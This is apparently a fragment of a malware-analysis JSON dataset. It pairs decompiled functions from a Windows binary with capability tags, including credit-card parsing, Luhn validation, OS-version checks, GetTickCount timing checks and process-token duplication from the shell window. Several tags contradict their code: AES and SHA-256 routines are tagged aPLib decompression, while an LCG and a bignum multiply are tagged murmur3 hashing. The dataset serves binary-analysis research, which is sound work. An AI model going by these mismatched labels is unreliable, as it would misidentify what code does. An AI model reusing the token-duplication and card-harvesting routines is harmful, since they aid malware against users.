        "decompiled_code": "\nint32_t * fcn.00408fa9(int32_t *param_1, uint8_t param_2, uint32_t param_3)\n\n{\n    uint32_t uVar1;\n    int32_t *piVar2;\n    \n    if (param_3 != 0) {\n        piVar2 = param_1;\n        for (uVar1 = param_3 >> 2; uVar1 != 0; uVar1 = uVar1 - 1) {\n            *piVar2 = param_2 * 0x1010101;\n            piVar2 = piVar2 + 1;\n        }\n        for (param_3 = param_3 & 3; param_3 != 0; param_3 = param_3 - 1) {\n            *piVar2 = param_2 * 0x1010101;\n            piVar2 = piVar2 + 1;\n        }\n    }\n    return param_1;\n}\n",
        "token_count": 210
    },
    "00404944": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
        "decompiled_code": "\nuint fcn.00404944(void)\n\n{\n    uint8_t uVar1;\n    int32_t arg_ch;\n    int32_t arg_8h;\n    int32_t iVar2;\n    uint var_8h;\n    uint var_4h;\n    \n    var_4h = 0;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetVersion)();\n    arg_ch = fcn.00406347(0x15, 0);\n    arg_8h = fcn.00409041(0x20a);\n    if (5 < uVar1) {\n        iVar2 = fcn.00404428();\n        if (iVar2 != 0) {\n            fcn.00403d4b(&var_8h, 0);\n            if ((arg_ch != 0) && (arg_8h != 0)) {\n                iVar2 = fcn.00405b0e(arg_8h);\n                if (iVar2 != 0) {\n                    var_4h = fcn.00403e9e(arg_8h, arg_ch);\n                }\n            }\n            fcn.00403d4b(var_8h, 1);\n        }\n    }\n    if (arg_8h != 0) {\n        fcn.004090a1(arg_8h);\n    }\n    fcn.004039da(arg_ch);\n    return var_4h;\n}\n",
        "token_count": 306
    },
    "004049d3": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.004049d3(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint var_90h;\n    uint var_8ch;\n    uint lpTokenAttributes;\n    uint var_40h;\n    uint uStack64;\n    int32_t var_38h;\n    int32_t var_34h;\n    uint uStack52;\n    uint uStack48;\n    uint var_28h;\n    uint var_24h;\n    int32_t lpModuleName;\n    uint lpdwProcessId;\n    uint var_18h;\n    code *var_14h;\n    int32_t var_10h;\n    int32_t hExistingToken;\n    int32_t phNewToken;\n    int32_t var_4h;\n    \n    var_18h = 0;\n    iVar2 = fcn.00406347(0x27, &var_24h);\n    lpModuleName = iVar2;\n    iVar3 = fcn.004090b5(iVar2);\n    var_4h = fcn.00409041(0x20a);\n    lpdwProcessId = 0;\n    var_14h = (*_sym.imp.KERNEL32.dll_GetVersion)();\n    var_10h = 0;\n    hExistingToken = 0;\n    phNewToken = 0;\n    var_90h = 0;\n    fcn.00408fa9(&var_8ch, 0, 0x40);\n    pcVar1 = _sym.imp.KERNEL32.dll_CloseHandle;\n    var_38h = 0;\n    var_34h = 0;\n    uStack52 = 0;\n    uStack48 = 0;\n    lpTokenAttributes = 0;\n    var_40h = 0;\n    uStack64 = 0;\n    if (5 < var_14h) {\n        fcn.00403d4b(&var_28h, 0);\n        uVar4 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(lpModuleName, iVar3 + 1 + iVar2);\n        var_14h = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar4);\n        if ((var_14h != NULL) && (var_4h != 0)) {\n            iVar2 = fcn.00405b0e(var_4h);\n            if (iVar2 != 0) {\n                iVar2 = (*_sym.imp.USER32.dll_GetShellWindow)();\n                if (iVar2 != 0) {\n                    iVar2 = (*_sym.imp.USER32.dll_GetWindowThreadProcessId)(iVar2, &lpdwProcessId);\n                    if (iVar2 != 0) {\n                        var_10h = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x400, 0, lpdwProcessId);\n                        if (var_10h != 0) {\n                            iVar2 = (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(var_10h, 0x2000000, &hExistingToken);\n                            if (iVar2 != 0) {\n                                lpTokenAttributes = 0xc;\n                                iVar2 = (*_sym.imp.ADVAPI32.dll_DuplicateTokenEx)\n                                                  (hExistingToken, 0x2000000, &lpTokenAttributes, 2, 1, &phNewToken);\n                                if (iVar2 != 0) {\n                                    var_18h = (*var_14h)(phNewToken, 0, var_4h, 0, 0, 0, 0, &var_90h, &var_38h);\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n        fcn.00403d4b(var_28h, 1);\n        if (var_10h != 0) {\n            (*pcVar1)(var_10h);\n        }\n    }\n    if (var_38h != 0) {\n        (*pcVar1)(var_38h);\n    }\n    if (var_34h != 0) {\n        (*pcVar1)(var_34h);\n    }\n    if (hExistingToken != 0) {\n        (*pcVar1)(hExistingToken);\n    }\n    if (phNewToken != 0) {\n        (*pcVar1)(phNewToken);\n    }\n    if (var_4h != 0) {\n        fcn.004090a1(var_4h);\n    }\n    fcn.004039b7(lpModuleName, var_24h);\n    return var_18h;\n}\n",
        "token_count": 1012
    },
    "00405c9d": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.00405c9d(int16_t *param_1)\n\n{\n    bool bVar1;\n    ushort *in_EAX;\n    int32_t iVar2;\n    ushort *puVar3;\n    uint32_t var_4h;\n    \n    var_4h = fcn.004090c6(param_1);\n    if ((((var_4h < 4) || (*param_1 != 0x5c)) || (param_1[1] != 0x5c)) || ((param_1[2] != 0x3f || (param_1[3] != 0x5c)))\n       ) {\n        bVar1 = false;\n        if ((var_4h < 3) || ((*param_1 != 0x5c || (param_1[1] != 0x5c)))) goto code_r0x00405cdd;\n        iVar2 = 1;\n    }\n    else {\n        bVar1 = true;\ncode_r0x00405cdd:\n        iVar2 = 0;\n        if (bVar1) goto code_r0x00405ced;\n    }\n    var_4h = var_4h + 4 + iVar2 * 2;\ncode_r0x00405ced:\n    if (var_4h < 0x7fff) {\n        *in_EAX = 0x5c;\n        in_EAX[1] = 0x5c;\n        in_EAX[2] = 0x3f;\n        in_EAX[3] = 0x5c;\n        puVar3 = in_EAX + 4;\n        if (iVar2 != 0) {\n            *puVar3 = 0x55;\n            in_EAX[5] = 0x4e;\n            in_EAX[6] = 0x43;\n            param_1 = param_1 + 2;\n            in_EAX[7] = 0x5c;\n            puVar3 = in_EAX + 8;\n        }\n        fcn.0040927d(puVar3, param_1);\n    }\n    else {\n        var_4h = 0;\n    }\n    return var_4h;\n}\n",
        "token_count": 492
    },
    "0040646a": {
        "rules": [
            "decompress data using aPLib/06666ba0b6a14a5481e4ee6eb664d454"
        ],
        "decompiled_code": "\nvoid fcn.0040646a(void)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint32_t *puVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    int32_t iVar8;\n    uint var_80ch;\n    uint var_410h;\n    uint var_40ch;\n    int32_t aiStack1036 [8];\n    int32_t var_3e8h;\n    int32_t var_3e0h;\n    int32_t var_3d8h;\n    int32_t var_3d4h;\n    uint32_t var_ch;\n    uint32_t var_8h;\n    uint32_t var_4h;\n    \n    iVar2 = 0;\n    uVar7 = 1;\n    uVar1 = uVar7;\n    do {\n        (&var_80ch)[iVar2] = uVar1;\n        aiStack1036[uVar1 - 1] = iVar2;\n        uVar1 = (uVar1 ^ -((uVar1 & 0x80) != 0) & 0x1b ^ uVar1 * 2) & 0xff;\n        iVar2 = iVar2 + 1;\n    } while (iVar2 < 0x100);\n    puVar3 = 0x40bd48;\n    uVar1 = uVar7;\n    do {\n        *puVar3 = uVar1;\n        puVar3 = puVar3 + 1;\n        uVar1 = (uVar1 * 2 ^ -((uVar1 & 0x80) != 0) & 0x1b) & 0xff;\n    } while (puVar3 < 0x40bd70);\n    *0x40b448 = 99;\n    *0x40d5d3 = 0;\n    do {\n        uVar1 = (&var_410h)[-aiStack1036[uVar7 - 1]];\n        uVar4 = (uVar1 >> 7 | uVar1 * 2) & 0xff;\n        uVar6 = uVar4 >> 7 | uVar4 * 2 & 0xff;\n        uVar5 = uVar6 >> 7 | uVar6 * 2 & 0xff;\n        uVar1 = uVar1 ^ uVar4 ^ uVar6 ^ uVar5 ^ ((uVar5 >> 7 | uVar5 * 2) ^ 99) & 0xff;\n        *(uVar7 + 0x40b448) = uVar1;\n        *(uVar1 + 0x40d570) = uVar7;\n        uVar7 = uVar7 + 1;\n    } while (uVar7 < 0x100);\n    iVar2 = 0;\n    do {\n        uVar7 = *(iVar2 + 0x40b448);\n        uVar1 = (-((*(iVar2 + 0x40b448) & 0x80) != 0) & 0x1b ^ uVar7 * 2) & 0xff;\n        uVar7 = (((uVar1 ^ uVar7) << 8 ^ uVar7) << 8 ^ uVar7) << 8;\n        uVar1 = uVar7 ^ uVar1;\n        *(iVar2 * 4 + 0x40d170) = uVar1;\n        uVar1 = uVar1 << 8;\n        uVar7 = uVar1 | uVar7 >> 0x18;\n        *(iVar2 * 4 + 0x40cd70) = uVar7;\n        uVar7 = uVar7 << 8;\n        uVar1 = uVar7 | uVar1 >> 0x18;\n        *(iVar2 * 4 + 0x40c970) = uVar1;\n        *(iVar2 * 4 + 0x40c570) = uVar1 << 8 | uVar7 >> 0x18;\n        if (*(iVar2 + 0x40d570) == 0) {\n            var_4h = 0;\n        }\n        else {\n            var_4h = (&var_80ch)[(aiStack1036[*(iVar2 + 0x40d570) - 1] + var_3d4h) % 0xff];\n        }\n        if (*(iVar2 + 0x40d570) == 0) {\n            var_ch = 0;\n        }\n        else {\n            var_ch = (&var_80ch)[(aiStack1036[*(iVar2 + 0x40d570) - 1] + var_3e8h) % 0xff];\n        }\n        if (*(iVar2 + 0x40d570) == 0) {\n            var_8h = 0;\n        }\n        else {\n            var_8h = (&var_80ch)[(aiStack1036[*(iVar2 + 0x40d570) - 1] + var_3d8h) % 0xff];\n        }\n        if (*(iVar2 + 0x40d570) == 0) {\n            iVar8 = 0;\n        }\n        else {\n            iVar8 = (&var_80ch)[(aiStack1036[*(iVar2 + 0x40d570) - 1] + var_3e0h) % 0xff];\n        }\n        var_4h = ((iVar8 << 8 ^ var_8h) << 8 ^ var_ch) << 8 ^ var_4h;\n        iVar8 = iVar2 + 1;\n        *(iVar2 * 4 + 0x40c170) = var_4h;\n        uVar1 = var_4h << 8 | var_4h >> 0x18;\n        *(iVar2 * 4 + 0x40bd70) = uVar1;\n        uVar1 = uVar1 << 8;\n        uVar7 = uVar1 | (var_4h << 8) >> 0x18;\n        *(iVar2 * 4 + 0x40b948) = uVar7;\n        *(iVar2 * 4 + 0x40b548) = uVar7 << 8 | uVar1 >> 0x18;\n        iVar2 = iVar8;\n    } while (iVar8 < 0x100);\n    return;\n}\n",
        "token_count": 1431
    },
    "0040669b": {
        "rules": [
            "decompress data using aPLib/06666ba0b6a14a5481e4ee6eb664d454"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040669b(int32_t *arg_8h, int32_t arg_ch, int32_t *arg_10h)\n\n{\n    int32_t iVar1;\n    uint32_t *puVar2;\n    ushort *puVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint32_t var_4h;\n    \n    uVar6 = 0;\n    if (*0x40d670 == 0) {\n        fcn.0040646a();\n        *0x40d670 = 1;\n    }\n    puVar2 = arg_8h + 6;\n    *arg_8h = 0xe;\n    arg_8h[1] = puVar2;\n    puVar3 = arg_ch + 2;\n    do {\n        puVar2[uVar6] = CONCAT31(CONCAT21(*puVar3, *(puVar3 + -1)), *(puVar3 + -1));\n        uVar6 = uVar6 + 1;\n        puVar3 = puVar3 + 2;\n    } while (uVar6 < 8);\n    iVar1 = *arg_8h;\n    if (iVar1 == 10) {\n        uVar6 = 0;\n        do {\n            uVar4 = CONCAT31(CONCAT21(CONCAT11(*((puVar2[3] & 0xff) + 0x40b448), *(*(puVar2 + 0xf) + 0x40b448)), \n                                      *(*(puVar2 + 0xe) + 0x40b448)), *(*(puVar2 + 0xd) + 0x40b448)) ^\n                    *(uVar6 + 0x40bd48) ^ *puVar2;\n            uVar6 = uVar6 + 4;\n            uVar5 = puVar2[1] ^ uVar4;\n            puVar2[4] = uVar4;\n            uVar4 = puVar2[2] ^ uVar5;\n            puVar2[6] = uVar4;\n            puVar2[5] = uVar5;\n            puVar2[7] = uVar4 ^ puVar2[3];\n            puVar2 = puVar2 + 4;\n        } while (uVar6 < 0x28);\n    }\n    else if (iVar1 == 0xc) {\n        uVar6 = 0;\n        do {\n            uVar4 = CONCAT31(CONCAT21(CONCAT11(*((puVar2[5] & 0xff) + 0x40b448), *(*(puVar2 + 0x17) + 0x40b448)), \n                                      *(*(puVar2 + 0x16) + 0x40b448)), *(*(puVar2 + 0x15) + 0x40b448)) ^\n                    *(uVar6 + 0x40bd48) ^ *puVar2;\n            uVar6 = uVar6 + 4;\n            uVar5 = puVar2[1] ^ uVar4;\n            puVar2[6] = uVar4;\n            uVar4 = puVar2[2] ^ uVar5;\n            puVar2[7] = uVar5;\n            uVar5 = puVar2[3] ^ uVar4;\n            puVar2[8] = uVar4;\n            uVar4 = puVar2[4] ^ uVar5;\n            puVar2[10] = uVar4;\n            puVar2[9] = uVar5;\n            puVar2[0xb] = uVar4 ^ puVar2[5];\n            puVar2 = puVar2 + 6;\n        } while (uVar6 < 0x20);\n    }\n    else if (iVar1 == 0xe) {\n        var_4h = 0;\n        do {\n            uVar6 = CONCAT31(CONCAT21(CONCAT11(*((puVar2[7] & 0xff) + 0x40b448), *(*(puVar2 + 0x1f) + 0x40b448)), \n                                      *(*(puVar2 + 0x1e) + 0x40b448)), *(*(puVar2 + 0x1d) + 0x40b448)) ^\n                    *(var_4h + 0x40bd48) ^ *puVar2;\n            var_4h = var_4h + 4;\n            uVar4 = puVar2[1] ^ uVar6;\n            puVar2[8] = uVar6;\n            uVar6 = puVar2[2] ^ uVar4;\n            puVar2[10] = uVar6;\n            puVar2[9] = uVar4;\n            uVar6 = puVar2[3] ^ uVar6;\n            puVar2[0xb] = uVar6;\n            uVar6 = CONCAT31(CONCAT21(CONCAT11(*(*(puVar2 + 0x2f) + 0x40b448), *(*(puVar2 + 0x2e) + 0x40b448)), \n                                      *(*(puVar2 + 0x2d) + 0x40b448)), *((uVar6 & 0xff) + 0x40b448)) ^ puVar2[4];\n            uVar4 = puVar2[5] ^ uVar6;\n            puVar2[0xc] = uVar6;\n            uVar6 = puVar2[6] ^ uVar4;\n            puVar2[0xe] = uVar6;\n            puVar2[0xd] = uVar4;\n            puVar2[0xf] = uVar6 ^ puVar2[7];\n            puVar2 = puVar2 + 8;\n        } while (var_4h < 0x1c);\n    }\n    arg_8h[2] = *arg_10h;\n    arg_8h[3] = arg_10h[1];\n    arg_8h[4] = arg_10h[2];\n    arg_8h[5] = arg_10h[3];\n    return 0;\n}\n",
        "token_count": 1380
    },
    "004082ee": {
        "rules": [
            "decompress data using aPLib/06666ba0b6a14a5481e4ee6eb664d454"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_128h\n\nvoid __fastcall fcn.004082ee(int32_t param_1)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    int32_t in_EAX;\n    uchar *puVar3;\n    uint32_t *puVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    uint32_t uVar11;\n    uint var_128h;\n    uint var_120h;\n    uint32_t var_20h;\n    uint32_t var_1ch;\n    uint32_t var_18h;\n    uint32_t var_14h;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    uint32_t var_8h;\n    uint32_t var_4h;\n    \n    uVar6 = 0;\n    puVar3 = param_1 + 1;\n    do {\n        (&var_120h)[uVar6] = CONCAT31(CONCAT21(CONCAT11(puVar3[-1], *puVar3), puVar3[1]), puVar3[2]);\n        uVar6 = uVar6 + 1;\n        puVar3 = puVar3 + 4;\n    } while (uVar6 < 0x10);\n    if (uVar6 < 0x40) {\n        var_4h = 0x40 - uVar6;\n        puVar4 = &var_128h + uVar6;\n        do {\n            uVar6 = *puVar4;\n            uVar1 = puVar4[-0xd];\n            iVar5 = var_4h + -1;\n            var_4h = iVar5;\n            puVar4[2] = ((uVar6 << 0xf | uVar6 >> 0x11) ^ (uVar6 << 0xd | uVar6 >> 0x13) ^ uVar6 >> 10) +\n                        ((uVar1 << 0xe | uVar1 >> 0x12) ^ (uVar1 >> 7 | uVar1 << 0x19) ^ uVar1 >> 3) + puVar4[-0xe] +\n                        puVar4[-5];\n            puVar4 = puVar4 + 1;\n        } while (iVar5 != 0);\n    }\n    var_14h = 0;\n    var_8h = *(in_EAX + 0x54);\n    var_ch = *(in_EAX + 0x58);\n    var_1ch = *(in_EAX + 0x5c);\n    var_10h = *(in_EAX + 100);\n    var_18h = *(in_EAX + 0x50);\n    var_20h = *(in_EAX + 0x68);\n    var_4h = *(in_EAX + 0x6c);\n    uVar6 = *(in_EAX + 0x60);\n    do {\n        uVar10 = var_18h;\n        uVar9 = uVar6;\n        uVar7 = var_20h;\n        uVar2 = var_8h;\n        uVar1 = var_ch;\n        var_20h = var_10h;\n        uVar6 = var_1ch;\n        iVar5 = ((uVar9 >> 0xb | uVar9 << 0x15) ^ (uVar9 << 7 | uVar9 >> 0x19) ^ (uVar9 >> 6 | uVar9 << 0x1a)) +\n                (~uVar9 & uVar7 ^ var_10h & uVar9) + *(var_14h + 0x40a238) + *(&var_120h + var_14h) + var_4h;\n        var_14h = var_14h + 4;\n        uVar8 = (var_8h ^ uVar10) & var_ch;\n        uVar11 = var_8h & uVar10;\n        var_4h = uVar7;\n        var_10h = uVar9;\n        var_1ch = var_ch;\n        var_ch = var_8h;\n        var_8h = uVar10;\n        uVar6 = uVar6 + iVar5;\n        var_18h = ((uVar10 >> 0xd | uVar10 << 0x13) ^ (uVar10 << 10 | uVar10 >> 0x16) ^ (uVar10 >> 2 | uVar10 << 0x1e))\n                  + (uVar8 ^ uVar11) + iVar5;\n    } while (var_14h < 0x100);\n    *(in_EAX + 0x50) = *(in_EAX + 0x50) + var_18h;\n    *(in_EAX + 0x54) = *(in_EAX + 0x54) + uVar10;\n    *(in_EAX + 0x58) = *(in_EAX + 0x58) + uVar2;\n    *(in_EAX + 0x5c) = *(in_EAX + 0x5c) + uVar1;\n    *(in_EAX + 0x60) = *(in_EAX + 0x60) + uVar6;\n    *(in_EAX + 100) = *(in_EAX + 100) + uVar9;\n    *(in_EAX + 0x68) = *(in_EAX + 0x68) + var_20h;\n    *(in_EAX + 0x6c) = *(in_EAX + 0x6c) + uVar7;\n    return;\n}\n",
        "token_count": 1282
    },
    "004068ee": {
        "rules": [
            "calculate modulo 256 via x86 assembly"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004068ee(int32_t *arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    uint32_t *puVar3;\n    uint32_t *puVar4;\n    int32_t iVar5;\n    uint32_t *puVar6;\n    int32_t var_134h;\n    int32_t var_130h;\n    int32_t var_12ch;\n    int32_t iStack300;\n    int32_t iStack296;\n    int32_t iStack292;\n    uint var_8h;\n    \n    fcn.00408fa9(&var_134h, 0, 0x128);\n    arg_8h[1] = arg_8h + 6;\n    iVar1 = fcn.0040669b(&var_134h, arg_ch, arg_10h);\n    if (iVar1 == 0) {\n        *arg_8h = var_134h;\n        arg_8h[2] = var_12ch;\n        arg_8h[3] = iStack300;\n        arg_8h[4] = iStack296;\n        arg_8h[5] = iStack292;\n        piVar2 = var_134h * 0x10 + var_130h;\n        arg_8h[6] = *piVar2;\n        arg_8h[7] = piVar2[1];\n        arg_8h[8] = piVar2[2];\n        arg_8h[9] = piVar2[3];\n        iVar5 = *arg_8h;\n        puVar6 = arg_8h + 10;\n        puVar4 = piVar2 + -4;\n        while (iVar5 = iVar5 + -1,  0 < iVar5) {\n            arg_8h = 0x4;\n            do {\n                puVar3 = puVar4;\n                *puVar6 = *(*(*(puVar3 + 3) + 0x40b448) * 4 + 0x40b548) ^ *(*(*(puVar3 + 2) + 0x40b448) * 4 + 0x40b948)\n                          ^ *(*(*(puVar3 + 1) + 0x40b448) * 4 + 0x40bd70) ^\n                          *(*((*puVar3 & 0xff) + 0x40b448) * 4 + 0x40c170);\n                puVar6 = puVar6 + 1;\n                arg_8h = arg_8h + -1;\n                puVar4 = puVar3 + 1;\n            } while (arg_8h != NULL);\n            puVar4 = puVar3 + -7;\n        }\n        *puVar6 = *puVar4;\n        puVar6[1] = puVar4[1];\n        puVar6[2] = puVar4[2];\n        puVar6[3] = puVar4[3];\n    }\n    return iVar1;\n}\n",
        "token_count": 685
    },
    "00407a8f": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00407a8f(uint arg_8h, int32_t arg_ch, uint32_t arg_10h)\n\n{\n    int16_t iVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint16_t *puVar4;\n    uint var_ch;\n    uint32_t var_8h;\n    int32_t var_4h;\n    \n    var_4h = 0;\n    iVar1 = *(arg_ch + 4);\n    iVar2 = fcn.00408052();\n    puVar4 = *(iVar2 + 0xc);\n    var_8h = 0;\n    iVar2 = *(arg_ch + 0xc);\n    fcn.00408fa9(puVar4, 0, iVar1 * 2 + 2);\n    do {\n        uVar3 = *(iVar2 + var_4h * 2) * (arg_10h & 0xffff) + var_8h + *puVar4;\n        *puVar4 = uVar3;\n        var_8h = uVar3 >> 0x10;\n        puVar4 = puVar4 + 1;\n        var_4h = var_4h + 1;\n    } while (var_4h < iVar1);\n    *puVar4 = uVar3 >> 0x10;\n    fcn.00407951();\n    fcn.004080e3();\n    return;\n}\n",
        "token_count": 319
    },
    "00407efa": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00407efa(uint arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    int16_t iVar1;\n    int16_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint32_t var_ch;\n    uint16_t *var_8h;\n    int32_t var_4h;\n    \n    iVar1 = *(arg_ch + 4);\n    var_4h = 0;\n    iVar2 = *(arg_10h + 4);\n    iVar4 = fcn.00408052();\n    iVar4 = *(iVar4 + 0xc);\n    iVar3 = *(arg_ch + 0xc);\n    var_8h = *(arg_10h + 0xc);\n    fcn.00408fa9(iVar4, 0, (iVar2 + iVar1) * 2);\n    do {\n        iVar7 = 0;\n        var_ch = 0;\n        iVar6 = var_4h;\n        do {\n            uVar5 = *(iVar3 + iVar7 * 2) * *var_8h + *(iVar4 + iVar6 * 2) + var_ch;\n            *(iVar4 + iVar6 * 2) = uVar5;\n            var_ch = uVar5 >> 0x10;\n            iVar6 = iVar6 + 1;\n            iVar7 = iVar7 + 1;\n        } while (iVar7 < iVar1);\n        var_4h = var_4h + 1;\n        var_8h = var_8h + 1;\n        *(iVar4 + iVar6 * 2) = uVar5 >> 0x10;\n    } while (var_4h < iVar2);\n    fcn.00407951();\n    fcn.00407951();\n    fcn.004080e3();\n    return;\n}\n",
        "token_count": 453
    },
    "0040848a": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\nvoid fcn.0040848a(void)\n\n{\n    uint32_t *puVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    uint uVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    int32_t in_EAX;\n    uint32_t uVar11;\n    uint32_t uVar12;\n    uint32_t uVar13;\n    uint8_t uVar14;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar2 = *(in_EAX + 0x40);\n    *(uVar2 + in_EAX) = 0x80;\n    uVar11 = uVar2 + 1;\n    if (uVar2 < 0x38) {\n        if (0x37 < uVar11) goto code_r0x004084e0;\n    }\n    else {\n        if (uVar11 < 0x40) {\n            fcn.00408fa9(uVar11 + in_EAX, 0, 0x40 - uVar11);\n        }\n        fcn.004082ee();\n    }\n    fcn.00408fa9();\ncode_r0x004084e0:\n    uVar11 = *(in_EAX + 0x40) * 8;\n    puVar1 = in_EAX + 0x48;\n    uVar2 = *puVar1;\n    *puVar1 = *puVar1 + uVar11;\n    uVar3 = *(in_EAX + 0x48);\n    *(in_EAX + 0x4c) = *(in_EAX + 0x4c) + CARRY4(uVar2, uVar11);\n    *(in_EAX + 0x3f) = *(in_EAX + 0x48);\n    uVar4 = *(in_EAX + 0x4c);\n    *(in_EAX + 0x3e) = uVar3 >> 8;\n    *(in_EAX + 0x3d) = uVar3 >> 0x10;\n    *(in_EAX + 0x3c) = uVar3 >> 0x18;\n    *(in_EAX + 0x3b) = uVar4;\n    *(in_EAX + 0x3a) = uVar4 >> 8;\n    *(in_EAX + 0x39) = uVar4 >> 0x10;\n    *(in_EAX + 0x38) = uVar4 >> 0x18;\n    fcn.004082ee();\n    uVar2 = *(in_EAX + 0x54);\n    uVar11 = *(in_EAX + 0x50);\n    uVar5 = *(in_EAX + 0x58);\n    uVar6 = *(in_EAX + 0x5c);\n    uVar7 = *(in_EAX + 0x60);\n    uVar8 = *(in_EAX + 100);\n    uVar9 = *(in_EAX + 0x68);\n    uVar10 = *(in_EAX + 0x6c);\n    uVar12 = 0;\n    do {\n        uVar14 = ('\\x03' - uVar12) * '\\b';\n        *(uVar12 + 0x40d680) = uVar11 >> (uVar14 & 0x1f);\n        *(uVar12 + 0x40d684) = uVar2 >> (uVar14 & 0x1f);\n        *(uVar12 + 0x40d688) = uVar5 >> (uVar14 & 0x1f);\n        *(uVar12 + 0x40d68c) = uVar6 >> (uVar14 & 0x1f);\n        *(uVar12 + 0x40d690) = uVar7 >> (uVar14 & 0x1f);\n        *(uVar12 + 0x40d694) = uVar8 >> (uVar14 & 0x1f);\n        *(uVar12 + 0x40d698) = uVar9 >> (uVar14 & 0x1f);\n        uVar13 = uVar12 + 1;\n        *(uVar12 + 0x40d69c) = uVar10 >> (uVar14 & 0x1f);\n        uVar12 = uVar13;\n    } while (uVar13 < 4);\n    return;\n}\n",
        "token_count": 1041
    },
    "00409508": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\nuint32_t fcn.00409508(void)\n\n{\n    *0x40d674 = *0x40d674 * 0x343fd + 0x269ec3;\n    return *0x40d674 >> 0x10 & 0x7fff;\n}\n",
        "token_count": 62
    },
    "004015a6": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004015a6(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h)\n\n{\n    int32_t arg_8h_00;\n    int16_t *piVar1;\n    int32_t arg_8h_01;\n    int32_t arg_8h_02;\n    int32_t arg_8h_03;\n    int32_t iVar2;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    arg_8h_00 = fcn.00409041(0x10);\n    piVar1 = fcn.00409041(0x20a);\n    arg_8h_01 = fcn.00406347(7, 0);\n    arg_8h_02 = fcn.00403bb3(8);\n    arg_8h_03 = fcn.00403bb3(9);\n    fcn.00408fa9(arg_8h_00, 0, 0x10);\n    if (piVar1 != NULL) {\n        if (arg_8h_00 == 0) goto code_r0x004016d9;\n        iVar2 = fcn.00405b7c(piVar1, 1);\n        if (iVar2 == 0) {\n            *piVar1 = 0;\n        }\n        if (arg_8h != 0) {\n            iVar2 = fcn.00403698(arg_8h_00, arg_8h);\n            if (iVar2 == 0) goto code_r0x004016ce;\n        }\n        if (arg_8h_01 != 0) {\n            iVar2 = fcn.004035d2(arg_8h_00 + 4);\n            if (iVar2 == 0) goto code_r0x004016ce;\n        }\n        if (arg_ch != 0) {\n            iVar2 = fcn.00403698(arg_8h_00 + 4, arg_ch);\n            if (iVar2 == 0) goto code_r0x004016ce;\n        }\n        if (arg_8h_02 != 0) {\n            iVar2 = fcn.004035d2(arg_8h_00 + 8);\n            if (iVar2 == 0) goto code_r0x004016ce;\n        }\n        if (arg_10h != 0) {\n            iVar2 = fcn.00403698(arg_8h_00 + 8, arg_10h);\n            if (iVar2 == 0) goto code_r0x004016ce;\n        }\n        if (*piVar1 != 0) {\n            iVar2 = fcn.004035d2(arg_8h_00 + 8);\n            if (iVar2 == 0) goto code_r0x004016ce;\n        }\n        if (arg_8h_03 != 0) {\n            iVar2 = fcn.004035d2(arg_8h_00 + 0xc);\n            if (iVar2 == 0) goto code_r0x004016ce;\n        }\n        if (arg_14h == 0) goto code_r0x004016d9;\n        iVar2 = fcn.00403698(arg_8h_00 + 0xc, arg_14h);\n        if (iVar2 != 0) goto code_r0x004016d9;\n    }\ncode_r0x004016ce:\n    if (arg_8h_00 != 0) {\n        fcn.00401567();\n        arg_8h_00 = 0;\n    }\ncode_r0x004016d9:\n    if (piVar1 != NULL) {\n        fcn.004090a1(piVar1);\n    }\n    fcn.004039da(arg_8h_01);\n    fcn.004039da(arg_8h_02);\n    fcn.004039da(arg_8h_03);\n    return arg_8h_00;\n}\n",
        "token_count": 890
    },
